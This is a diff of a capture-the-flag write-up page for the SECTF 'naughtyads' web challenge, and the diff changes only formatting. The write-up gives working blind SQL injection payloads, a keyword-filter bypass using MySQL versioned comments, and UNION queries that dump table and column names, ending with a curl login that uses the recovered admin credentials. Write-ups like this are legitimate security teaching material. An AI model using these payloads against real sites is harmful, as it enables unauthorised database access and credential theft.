@@ -18,13 +18,13 @@
   
   
   <title>[Web] SECTF - naughtyads | TeamRocketIST - Portuguese CTF Team</title>
-  <meta name="description" content="Naughty ads - Web (200 + 0) Can you put agent Gill in the naughty ad section? His phone number is “555-31338” Solves: 122 Service: http://naughtyads.alieni.se/ Author: avlidienbrunn  Checking in robo">
-<meta name="keywords" content="web,filterbypass,sqlinjection,blindsqli,httpauth">
+  <meta name="description" content="Naughty ads - Web (200 + 0)Can you put agent Gill in the naughty ad section? His phone number is “555-31338”Solves: 122Service: http://naughtyads.alieni.se/Author: avlidienbrunn  Checking in robots.tx">
+<meta name="keywords" content="web,filterbypass,blindsqli,sqlinjection,httpauth">
 <meta property="og:type" content="article">
 <meta property="og:title" content="[Web] SECTF - naughtyads">
 <meta property="og:url" content="https://teamrocketist.github.io/2017/09/15/Web-SECTF-naughtyads/index.html">
 <meta property="og:site_name" content="TEAMROCKETIST">
-<meta property="og:description" content="Naughty ads - Web (200 + 0) Can you put agent Gill in the naughty ad section? His phone number is “555-31338” Solves: 122 Service: http://naughtyads.alieni.se/ Author: avlidienbrunn  Checking in robo">
+<meta property="og:description" content="Naughty ads - Web (200 + 0)Can you put agent Gill in the naughty ad section? His phone number is “555-31338”Solves: 122Service: http://naughtyads.alieni.se/Author: avlidienbrunn  Checking in robots.tx">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="https://i.imgur.com/55vYxqN.png">
 <meta property="og:image" content="https://i.imgur.com/exBhKMF.png">
@@ -35,7 +35,7 @@
 <meta property="og:updated_time" content="2022-08-23T00:14:55.169Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="[Web] SECTF - naughtyads">
-<meta name="twitter:description" content="Naughty ads - Web (200 + 0) Can you put agent Gill in the naughty ad section? His phone number is “555-31338” Solves: 122 Service: http://naughtyads.alieni.se/ Author: avlidienbrunn  Checking in robo">
+<meta name="twitter:description" content="Naughty ads - Web (200 + 0)Can you put agent Gill in the naughty ad section? His phone number is “555-31338”Solves: 122Service: http://naughtyads.alieni.se/Author: avlidienbrunn  Checking in robots.tx">
 <meta name="twitter:image" content="https://i.imgur.com/55vYxqN.png">
   <!-- Canonical links -->
   <link rel="canonical" href="https://teamrocketist.github.io/2017/09/15/Web-SECTF-naughtyads/index.html">
@@ -368,16 +368,10 @@
     </div>
     <div class="article-entry marked-body" itemprop="articleBody">
       
-        <blockquote>
-<p>Naughty ads - Web (200 + 0)</p>
-<p>Can you put agent Gill in the naughty ad section? His phone number is “555-31338”</p>
-<p>Solves: 122</p>
-<p>Service: <a href="http://naughtyads.alieni.se/" target="_blank" rel="noopener">http://naughtyads.alieni.se/</a></p>
-<p>Author: avlidienbrunn</p>
-</blockquote>
+        <blockquote><br><br>Naughty ads - Web (200 + 0)<br><br>Can you put agent Gill in the naughty ad section? His phone number is “555-31338”<br><br>Solves: 122<br><br>Service: <a href="http://naughtyads.alieni.se/" target="_blank" rel="noopener">http://naughtyads.alieni.se/</a><br><br>Author: avlidienbrunn<br><br></blockquote>
+
 <p>Checking in robots.txt we have a hidden directory called admin, but there is a http authentication and we don’t know the user and the password, we need to find a vulnerability to get the credentials.</p>
-<h3 id="finding-the-vulnerability"><a class="markdownIt-Anchor" href="#finding-the-vulnerability"></a> Finding the vulnerability</h3>
-<p>Another Sql injection after some searching I found a GET param vulnerable to blind SQLi</p>
+<h3 id="Finding-the-vulnerability"><a href="#Finding-the-vulnerability" class="headerlink" title="Finding the vulnerability"></a>Finding the vulnerability</h3><p>Another Sql injection after some searching I found a GET param vulnerable to blind SQLi</p>
 <p>Successful query that returns content :</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://naughtyads.alieni.se?id=3ad3-46c3-b975' AND 1 AND 'A'='A</span><br></pre></td></tr></table></figure>
 <p><img src="https://i.imgur.com/55vYxqN.png" alt></p>
@@ -385,12 +379,10 @@
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://naughtyads.alieni.se?id=3ad3-46c3-b975' AND 1 AND 'A'='B</span><br></pre></td></tr></table></figure>
 <p><img src="https://i.imgur.com/exBhKMF.png" alt></p>
 <hr>
-<h3 id="bypassing-filters"><a class="markdownIt-Anchor" href="#bypassing-filters"></a> Bypassing filters</h3>
-<p>Now there is some kind of protection, there is a filter blacklisting alot of SQL words, one way of bypassing it is by doing this:</p>
+<h3 id="Bypassing-filters"><a href="#Bypassing-filters" class="headerlink" title="Bypassing filters"></a>Bypassing filters</h3><p>Now there is some kind of protection, there is a filter blacklisting alot of SQL words, one way of bypassing it is by doing this:</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// bypasses or filter</span><br><span class="line">http://naughtyads.alieni.se?id=3ad3-46c3-b975' <span class="comment">/*!50000or*/</span> 1 AND 'A'='A</span><br></pre></td></tr></table></figure>
 <p><img src="https://i.imgur.com/5iPiplZ.png" alt></p>
-<h3 id="performing-union-injections"><a class="markdownIt-Anchor" href="#performing-union-injections"></a> Performing Union Injections</h3>
-<p>Getting Table names:</p>
+<h3 id="Performing-Union-Injections"><a href="#Performing-Union-Injections" class="headerlink" title="Performing Union Injections"></a>Performing Union Injections</h3><p>Getting Table names:</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://naughtyads.alieni.se/?id=3ad3-46c3-b97' <span class="comment">/*!50000union*/</span> <span class="comment">/*!50000all*/</span> <span class="comment">/*!50000select*/</span> group_concat(table_name) <span class="comment">/*!50000from*/</span> information_schema.tables <span class="comment">/*!50000where*/</span> table_schema=database() AND '1'='1</span><br></pre></td></tr></table></figure>
 <p><img src="https://i.imgur.com/rL6GHpT.png" alt></p>
 <p>Getting Columns names:</p>
@@ -401,8 +393,7 @@
 <p><img src="https://i.imgur.com/i72v18w.png" alt></p>
 <p>After searching in google the hash 5ebe2294ecd0e0f08eab7690d2a6ee69 is secret</p>
 <hr>
-<h3 id="admin-login"><a class="markdownIt-Anchor" href="#admin-login"></a> Admin Login</h3>
-<p>We have a simple form with a image upload well if we remember the challenge description:</p>
+<h3 id="Admin-Login"><a href="#Admin-Login" class="headerlink" title="Admin Login"></a>Admin Login</h3><p>We have a simple form with a image upload well if we remember the challenge description:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Can you put agent Gill in the naughty ad section? His phone number is &quot;555-31338&quot;</span><br></pre></td></tr></table></figure>
 <p>So lets put the number and submit the form:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span class="string">'http://naughtyads.alieni.se/admin/'</span> --user webmasterofdoom3755:secret --data <span class="string">'phone=555-31338'</span></span><br><span class="line">SECT&#123;~tr4nsv3stiT3s_w3lc0me_t00~&#125;</span><br></pre></td></tr></table></figure>
